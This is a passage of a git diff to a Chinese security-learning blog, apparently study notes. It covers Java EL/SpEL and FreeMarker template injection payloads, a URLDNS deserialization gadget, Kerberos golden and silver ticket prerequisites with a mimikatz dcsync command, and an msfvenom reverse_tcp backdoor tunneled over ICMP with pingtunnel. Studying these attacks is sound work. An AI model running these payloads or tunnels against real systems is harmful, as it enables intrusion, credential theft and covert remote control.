+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">	&lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">	$&#123;Runtime.getRuntime().exec(&quot;calc&quot;)&#125;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718105942751.png" alt="image-20230718105942751"></p>
+<h6 id="cve-2011-2730-spring-标签EL表达式漏洞"><a href="#cve-2011-2730-spring-标签EL表达式漏洞" class="headerlink" title="cve-2011-2730 spring 标签EL表达式漏洞"></a>cve-2011-2730 spring 标签EL表达式漏洞</h6><blockquote>
+<p>漏洞成因是 Spring 的 message 标签能够解析执行 EL 表达式，而 Web 容器也会对 EL<br>表达式进行一次解析，两次解析使 EL 表达式注入得以利用</p>
+</blockquote>
+<p>​	Spring 表达式语言（SpEL）是一种与 EL 功能类似的表达式语言，可以独立于spring容器使用，</p>
+<p>​	在spel中<code>EvaluationContext</code>是用于评估表达式和解析属性、方法以及字段并帮助执行类型转换的接口，这个接口有两种实现<code>SimpleEvaluationContext</code>和<code>StandardEvaluationContext</code>默认是用<code>StandardEvaluationContext</code>对表达式进行评估</p>
+<ul>
+<li>SimpleEvaluationContext，针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开spel语言特性和配置选项的子集</li>
+<li>StandardEvaluationContext，针对全套SpEL语言功能和配置选项，用户可以使用它来指定默认的根对象并配置每个可用的评估相关策略</li>
+</ul>
+<p>​	当使用StandardEvaluationContext进行上下文评估时，由于StandardEvaluationContext权限过大，可以执行java任意代码，例如利用runtime执行来弹出一个计算器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">expressionstr</span> <span class="operator">=</span> <span class="string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line"><span class="comment">//一个解析器</span></span><br><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">EvaluationContext</span> <span class="variable">evaluationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(expressionstr);</span><br><span class="line">System.out.println(expression.getValue(evaluationContext));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718111401476.png" alt="image-20230718111401476"></p>
+<h6 id="cve-2018-1273-spring-datacommons-远程代码执行漏洞"><a href="#cve-2018-1273-spring-datacommons-远程代码执行漏洞" class="headerlink" title="cve-2018-1273 spring datacommons 远程代码执行漏洞"></a>cve-2018-1273 spring datacommons 远程代码执行漏洞</h6><blockquote>
+<p>攻击者可以构造含有恶意代码的 SpEL 表达式实现远程代码执行，接管服务器权限</p>
+</blockquote>
+<p>官方发布的修复补丁中，可以清晰的看到使用了SimpleEvaluationContext代替了StandardEvaluationContext</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718112106689.png" alt="image-20230718112106689"></p>
+<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><blockquote>
+<p>web中广泛使用模板引擎来进行页面的定制化呈现，用户可以通过模板定制化展示符合自身特征的页面，模板引擎支持的页面定制展示的同时也带来了一定的安全风险</p>
+</blockquote>
+<h6 id="freemarker模板基础"><a href="#freemarker模板基础" class="headerlink" title="freemarker模板基础"></a>freemarker模板基础</h6><p>freemarker模板文件和html一样是静态页面，freemarker引擎解析并动态替换模板中的内容进行渲染，随后将渲染出的结果发送到访问者的浏览器中，</p>
+<p>freemarker模板语言有四个部分组成，</p>
+<ul>
+<li>文本：文本会原样输出</li>
+<li>插值：这部分的输出会被模板引擎计算的值进行替换</li>
+<li>FTL标签：和HTML类似，他是给freemarker提示，不会打印在输出内容中</li>
+<li>注释：和HTML一样</li>
+</ul>
+<h6 id="new函数的利用"><a href="#new函数的利用" class="headerlink" title="new函数的利用"></a>new函数的利用</h6><p>new函数可以创建继承自<code>freemarker.template.TemplateModel</code>的实例，查看源码会发现<code>freemarker.template.utility.Execute#exec</code>可以执行任意代码，因此可以通过new函数实例化一个execute对象并执行一个exec（）方法造成任意代码执行</p>
+<p>payload代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.</span><br><span class="line">exe&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过阅读代码发现<code>freemarker.template.utility</code>包中有几个类都可以被利用来执行恶意代码</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718131713569.png" alt="image-20230718131713569"></p>
+<h6 id="api函数的利用"><a href="#api函数的利用" class="headerlink" title="api函数的利用"></a>api函数的利用</h6><p>api函数可以用来访问java api 使用方法为value?api.somejavamethod(),相当于value.somejavamethod（）,因此可以利用api函数通过getclassloader来获取一个类加载器，进而加载恶意类，也可以通过getresource来读取服务器上的资源文件</p>
+<p>&lt;#assign classLoader&#x3D;object?api.class.getClassLoader()&gt;<br>${classLoader.loadClass(“Evil.class”)}</p>
+<h6 id="OFCMS1-1-2版本注入漏洞"><a href="#OFCMS1-1-2版本注入漏洞" class="headerlink" title="OFCMS1.1.2版本注入漏洞"></a>OFCMS1.1.2版本注入漏洞</h6><blockquote>
+<p>ofcms是java版的cms系统，fcms1.1.3之前的版本，</p>
+</blockquote>
+<p>OFCMS使用freemarker作为模板引擎，然而开发者未对网站后台的模拟文件功能处的所存储的模板数据进行过滤，导致攻击者可以使用freemarker模板注入的方式获取webshell</p>
+<h6 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h6><p>该漏洞出现的文件路径为<code>oufu-ofcms-V1.1.2\ofcms\ofcms-admin\src\main\Java\com\ ofsoft\cms\admin\controller\cms\TemplateController.Java</code>，通过在TemplateController类的save方法设置断点可以发现，save方法未对存入模板的数据进行充足的过滤，攻击者可以将可执行系统命令的恶意代码存入freemarker模板</p>
+<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><p>官方针对new和api的两种利用方式发布了一些策略，从版本2.3.22开始，api_builtin_enabled的默认值为false，这意味着api内建函数在此之后不能随意使用。</p>
+<p>官方还提供了3个预定义函数的解析器来限制new函数对类的访问</p>
+<ul>
+<li>UNRESTRICTED_RESOLVER：简单地调用 ClassUtil.forName(String)。</li>
+<li>SAFER_RESOLVER：与第一个类似，但禁止解析 ObjectConstructor、Execute和 freemarker.template.utility.JythonRuntime。</li>
+<li>ALLOWS_NOTHING_RESOLVER：禁止解析任何类</li>
+</ul>
+<p>官方手册中也表明了应当限制普通用户可以上传和限制模板文件的权限，OFCMS1.1.2版本的注入漏洞正是可编辑模板文件造成的任意代码执行</p>
+<h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><p>jwt token猜解实验</p>
+<h4 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h4><p>吧url放到hashmap里边，hashMap的hashCode函数可以反序列化</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230716160846520.png" alt="image-20230716160846520"></p>
+<p>1.hashmap接受参数O</p>
+<p>2.目标类B URL</p>
+<p>3.调用B.hashcode</p>
+<p>4.hashmap.readObject –&gt;O.hashcode</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"><span class="comment">//        这里不要发起请求，吧url对象的hashcode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://tp12s4.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//		这里吧url对象的hashcodde改成1234</span></span><br><span class="line">        hashCodefield.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这里吧hashcode改回-1</span></span><br><span class="line">        <span class="comment">//通过反射，改变已有对象的属性</span></span><br><span class="line"><span class="comment">//        hashCodefield.set(url,-1);</span></span><br><span class="line">        serialize(hashmap);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>分析反序列化</p>
+<p>在反序列化漏洞中的应用</p>
+<p>​    定制需要的对象</p>
+<p>​	通过invoke调用除了同名函数以外的函数</p>
+<p>​	通过class类创建对象，引入不能序列化的类</p>
+<p>​	runtime.class</p>
+<p>java反序列化漏洞</p>
+<p>关于防御</p>
 ]]></content>
       <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kerberos协议</title>
-    <url>/2023/06/21/kerberos%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p> <a href="https://blog.csdn.net/zzq060143/article/details/120531735">https://blog.csdn.net/zzq060143/article/details/120531735</a></p>
-<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><h5 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h5><p>自己登陆自己电脑</p>
-<h5 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h5><p>两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
-<h5 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h5><blockquote>
-<p>域环境中的认证方式</p>
-</blockquote>
-<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h6><p>密钥分发中心KDC(Key Distribution Center ) ，密钥分发中心一般又分为两部分，分别是</p>
-<p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
-<p>​		TGS(Ticket Granting Server): 票据授予服务器，用来发放整个认证过程以及客户端访问服务端是所系的服务授予票据(Ticket)</p>
-<h6 id="三次通信验证机制"><a href="#三次通信验证机制" class="headerlink" title="三次通信验证机制"></a>三次通信验证机制</h6><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230702024819915.png" alt="image-20230702024819915"></p>
-<p>第一次：客户端请求AS，传递自己的信息给AS</p>
-<p>AS收到请求后，去数据库验证你是否存在，不验证对错，如果存在，AS产生随机的session key，这个key将用于你和TGS的通信</p>
-<p>AS会发送两部分信息给你，一部分是TGT，通过KDC自己的密码加密，另一部分通过你的密码加密，如果你的密码是正确的，你可以解密第二部分信息，获取到TGS session key ,如果密码不正确，无法解密，则认证失败，第一部分是TGT你是无法解密的，需要暂时缓存起来。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 1</span></span><br><span class="line">name</span><br><span class="line">ip</span><br><span class="line">TGT的有效时间</span><br><span class="line"><span class="comment">#回送信息 2</span></span><br><span class="line">name     KDC 自己的密码加密</span><br><span class="line">ip</span><br><span class="line">TGS name</span><br><span class="line">TGT 生命周期</span><br><span class="line">时间戳</span><br><span class="line">TGS session key</span><br><span class="line"></span><br><span class="line">TGS name   你的密码加密</span><br><span class="line">时间戳</span><br><span class="line">生命周期</span><br><span class="line">TGS session key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>第二次：如果第一部分你已经成功，那你已经获得无法解密的TGT和TGS session key  ，请求TGS，</p>
-<p>TGS收到信息后，检查数据库中是否包含你请求的http服务名，如果存在，则通过KDC的密码解密TGT，这时，我们就能获取到TGS session key 然后通过TGS session key去解密你传输的第一部分认证器，获取到你的用户名和时间戳，此时TGS在进行验证：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比TGT中的用户名与认证器中的用户</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在TGS缓存中(避免应答攻击)</span><br><span class="line">6.可以在这部分添加权限认证服务</span><br></pre></td></tr></table></figure>
-
-<p>TGS随机产生一个HTTP service session key ，同时准备http service ticket(ST)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 3</span></span><br><span class="line">name    TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">请求的服务名</span><br><span class="line">http service 的ticket的生存周期    明文传输</span><br><span class="line"><span class="comment"># 回送信息 4   </span></span><br><span class="line">name      通过http服务的密码加密(ST)</span><br><span class="line">IP</span><br><span class="line">时间戳</span><br><span class="line">http服务name</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br><span class="line"></span><br><span class="line">http服务的name   通过TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br></pre></td></tr></table></figure>
-
-<p>你收到信息后，通过TGS session key 解密，获取了HTTP session key,但是你无法解密ST</p>
-<p>第三次：前面两步成功后，以后每次获取http服务，在ticket没有过期，或者无更新的情况下，都可以直接进行这一步，省略前面的两个步骤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 请求信息</span><br><span class="line">name    http service session key加密</span><br><span class="line">时间戳</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>服务端收到后，通过自己的密码解压ST(KDC是http服务的密码加密的)，这样就能够获取到http servicesession key 解密好之后，进行检查</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比ST中的用户名，与认证器中的用户名</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在HTTP服务的缓冲中</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回答信息</span><br><span class="line">http服务name</span><br><span class="line">时间戳</span><br></pre></td></tr></table></figure>
-
-<p>你通过缓存的http service session key 解密这部分信息，然后验证是否是你想要的服务器发给你的信息，完成验证</p>
-<p>黄金票据: 直接跳过AS ，伪造tgt获得st</p>
-<p>伪造条件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称  (shell net config workstation)</span><br><span class="line">2.域的SID值(shell whoami /user)</span><br><span class="line">3.域的KRBTGT账号的hash(lsadump::dcsync /domain:tset.cocm /all /csv)</span><br><span class="line">4.伪造任意用户名(随便写)</span><br></pre></td></tr></table></figure>
-
-<p>白银票据: 直接伪造ST，更加隐蔽和难以检测</p>
-<p>白银票据伪造条件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM hash</span><br><span class="line">6.需要伪造的用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h5 id="委派攻击、"><a href="#委派攻击、" class="headerlink" title="委派攻击、"></a>委派攻击、</h5><blockquote>
-<p>在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的。 </p>
-</blockquote>
-<p>约束性委派</p>
-<p>非约束性委派</p>
-<p>基于资源的约束性委派</p>
-<p><a href="https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
-]]></content>
-      <tags>
-        <tag>内网</tag>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -1033,17 +1236,454 @@
 <h3 id="26-rtsp未授权访问"><a href="#26-rtsp未授权访问" class="headerlink" title="26.rtsp未授权访问"></a>26.rtsp未授权访问</h3>]]></content>
   </entry>
   <entry>
-    <title>长亭蓝中面试</title>
+    <title>面试题</title>
     <url>/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/</url>
-    <content><![CDATA[<p>自我介绍</p>
+    <content><![CDATA[<p>ct蓝中</p>
 <p>SQL注入的类型,  报错注入函数三个，主流防御sql注入的方式</p>
 <p>中间件漏洞讲一下，weblogic，log4j，shiro,fastjson特征   jndi的攻击复现过没有，具体的细节是什么<br>监控的时候怎么区分扫描器和真实攻击ip<br>护网的时候用过什么设备<br>内网了解吗，xxx工具用过没</p>
 <p>告警出现dns隐匿隧道，dns隐匿隧道如何区分，是不是误报  ，dns隧道和常规的dns解析有什么区别<br>ps：金融的一些内网流量可以dns解析出去，但是ping不通</p>
 <p>落地的wabshell怎么开展工作，排查工具有什么<br>怎么排查自启动项</p>
 <p>文件上传绕waf<br>溯源怎么溯<br>cs反制rce  （CVE-2022-39197,CVE-2022-23317,CVE-2021-36798)<br>内网的重点系统是什么，比如说集权之类的，域控算一个，还有什么</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>webshell工具特征</p>
+<p>jsp马</p>
+<p>不管是普通还是魔改的工具，都是post传输，因为webshell的payload过于巨大，超过了默认的tomcat header大小(8024字节)，所以只能使用POST传输，流量监测设备都是重点监控POST请求</p>
+]]></content>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Proxifier</title>
+    <url>/2023/07/11/Proxifier/</url>
+    <content><![CDATA[<p><a href="https://blog.zgsec.cn/index.php/archives/278/">https://blog.zgsec.cn/index.php/archives/278/</a></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img2412617656.png" alt="玩转代理-1.png"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230711204019502.png" alt="image-20230711204019502"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230711204007698.png" alt="image-20230711204007698"></p>
+<p>代理规则中要新增一个代理规则，</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230711204508203.png" alt="image-20230711204508203"></p>
+<p>直接连接，不走代理，有些进程在本地通讯中会用到这个玩意，必须先让它直连，如果它走代理的话对应的进程会出问题的</p>
+]]></content>
+      <tags>
+        <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网</title>
+    <url>/2023/06/21/%E5%86%85%E7%BD%91/</url>
+    <content><![CDATA[<h4 id="CS-DNS隧道上线"><a href="#CS-DNS隧道上线" class="headerlink" title="CS DNS隧道上线"></a>CS DNS隧道上线</h4><p><a href="https://whale3070.github.io/2021/02/05/11-x/#%E5%9F%BA%E7%A1%80">https://whale3070.github.io/2021/02/05/11-x/#%E5%9F%BA%E7%A1%80</a></p>
+<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><h5 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h5><p>自己登陆自己电脑</p>
+<h5 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h5><p>两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
+<h5 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h5><blockquote>
+<p>域环境中的认证方式</p>
+<p><a href="https://blog.csdn.net/zzq060143/article/details/120531735">https://blog.csdn.net/zzq060143/article/details/120531735</a></p>
+<p><a href="https://www.freebuf.com/articles/network/371446.html">https://www.freebuf.com/articles/network/371446.html</a></p>
+</blockquote>
+<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h6><p>密钥分发中心KDC(Key Distribution Center ) ，密钥分发中心一般又分为两部分，分别是</p>
+<p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
+<p>​		TGS(Ticket Granting Server): 票据授予服务器，用来发放整个认证过程以及客户端访问服务端是所系的服务授予票据(Ticket)</p>
+<h6 id="三次通信验证机制"><a href="#三次通信验证机制" class="headerlink" title="三次通信验证机制"></a>三次通信验证机制</h6><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230702024819915.png" alt="image-20230702024819915"></p>
+<p>第一次：客户端请求AS，传递自己的信息给AS</p>
+<p>AS收到请求后，去数据库验证你是否存在，不验证对错，如果存在，AS产生随机的session key，这个key将用于你和TGS的通信</p>
+<p>AS会发送两部分信息给你，一部分是TGT，通过KDC自己的密码加密，另一部分通过你的密码加密，如果你的密码是正确的，你可以解密第二部分信息，获取到TGS session key ,如果密码不正确，无法解密，则认证失败，第一部分是TGT你是无法解密的，需要暂时缓存起来。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 1</span></span><br><span class="line">name</span><br><span class="line">ip</span><br><span class="line">TGT的有效时间</span><br><span class="line"><span class="comment">#回送信息 2</span></span><br><span class="line">name     KDC 自己的密码加密</span><br><span class="line">ip</span><br><span class="line">TGS name</span><br><span class="line">TGT 生命周期</span><br><span class="line">时间戳</span><br><span class="line">TGS session key</span><br><span class="line"></span><br><span class="line">TGS name   你的密码加密</span><br><span class="line">时间戳</span><br><span class="line">生命周期</span><br><span class="line">TGS session key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二次：如果第一部分你已经成功，那你已经获得无法解密的TGT和TGS session key  ，请求TGS，</p>
+<p>TGS收到信息后，检查数据库中是否包含你请求的http服务名，如果存在，则通过KDC的密码解密TGT，这时，我们就能获取到TGS session key 然后通过TGS session key去解密你传输的第一部分认证器，获取到你的用户名和时间戳，此时TGS在进行验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比TGT中的用户名与认证器中的用户</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在TGS缓存中(避免应答攻击)</span><br><span class="line">6.可以在这部分添加权限认证服务</span><br></pre></td></tr></table></figure>
+
+<p>TGS随机产生一个HTTP service session key ，同时准备http service ticket(ST)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 3</span></span><br><span class="line">name    TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">请求的服务名</span><br><span class="line">http service 的ticket的生存周期    明文传输</span><br><span class="line"><span class="comment"># 回送信息 4   </span></span><br><span class="line">name      通过http服务的密码加密(ST)</span><br><span class="line">IP</span><br><span class="line">时间戳</span><br><span class="line">http服务name</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br><span class="line"></span><br><span class="line">http服务的name   通过TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br></pre></td></tr></table></figure>
+
+<p>你收到信息后，通过TGS session key 解密，获取了HTTP session key,但是你无法解密ST</p>
+<p>第三次：前面两步成功后，以后每次获取http服务，在ticket没有过期，或者无更新的情况下，都可以直接进行这一步，省略前面的两个步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 请求信息</span><br><span class="line">name    http service session key加密</span><br><span class="line">时间戳</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>服务端收到后，通过自己的密码解压ST(KDC是http服务的密码加密的)，这样就能够获取到http servicesession key 解密好之后，进行检查</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比ST中的用户名，与认证器中的用户名</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在HTTP服务的缓冲中</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回答信息</span><br><span class="line">http服务name</span><br><span class="line">时间戳</span><br></pre></td></tr></table></figure>
+
+<p>你通过缓存的http service session key 解密这部分信息，然后验证是否是你想要的服务器发给你的信息，完成验证</p>
+<p>黄金票据: 直接跳过AS ，伪造tgt获得st</p>
+<p>伪造条件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称  (shell net config workstation)</span><br><span class="line">2.域的SID值(shell whoami /user)</span><br><span class="line">3.域的KRBTGT账号的hash(lsadump::dcsync /domain:tset.cocm /all /csv)</span><br><span class="line">4.伪造任意用户名(随便写)</span><br></pre></td></tr></table></figure>
+
+<p>白银票据: 直接伪造ST，更加隐蔽和难以检测</p>
+<p>白银票据伪造条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM hash</span><br><span class="line">6.需要伪造的用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="委派攻击、"><a href="#委派攻击、" class="headerlink" title="委派攻击、"></a>委派攻击、</h5><blockquote>
+<p>在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的。 </p>
+</blockquote>
+<p>约束性委派</p>
+<p>非约束性委派</p>
+<p>基于资源的约束性委派</p>
+<p><a href="https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
+<h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><p>今天在学习内网的时候上传后门后遇到了TCP协议不出网的问题</p>
+<p>解决方法是利用pingtunnel脚本将TCP流量转换成ICMP 流量从而实现MSF上线</p>
+<p>把TCP协议数据封装成ICMP协议数据 隧道技术</p>
+<p><strong>具体流程：</strong></p>
+<p>**1.**生成后门:<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1 LPORT&#x3D;3333 -f exe &gt; xd.exe</p>
+<p>**2.**MSF启动监听:<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set Ipont 4444</p>
+<p>exploit</p>
+<p>**3.**Kali开启隧道:<br>.&#x2F;pingtunnel -type server</p>
+<p>**4.**Win开启隧道&#x2F;&#x2F;将本地3333icmp协议数据转发至66ip的4444流量上(管理员运行)</p>
+<p>pingtunnel.exe -type client -l 127.0.0.1:3333 -5 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1</p>
+<p>这样做的目的是通过pingtunnel利用隧道把TCP流量转换成ICMP流量</p>
+<p>1、pingtunnle 客户端先将tcp转为了icmp （这一步就已经完成了出网）<br>2、pingtunnle 服务端将icmp转为tcp<br>3、pingtunnle 服务端紧接着转发到msf4444端口</p>
+<p>这是很简单得出网底层逻辑，这个逻辑可以套用在任何出网技巧</p>
+]]></content>
+      <tags>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各种软件的安装</title>
+    <url>/2023/07/14/%E5%AE%89%E8%A3%85%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6/</url>
+    <content><![CDATA[<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><p>less和more类似,但是使用less可以随意浏览文件,而more仅能向前移动,却不能向后移动,more启动时会加载整个文件。而且less在查看之前不会加载整个文件  </p>
+<h6 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h6><p>用来处理文本，将文本按照指定的格式输出。其中包含了变量，循环以及数组</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]#awk -F: &#x27;&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h6 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h6><p>进去容器中</p>
+<p>docker exec -it  <id> &#x2F;bin&#x2F;bash</p>
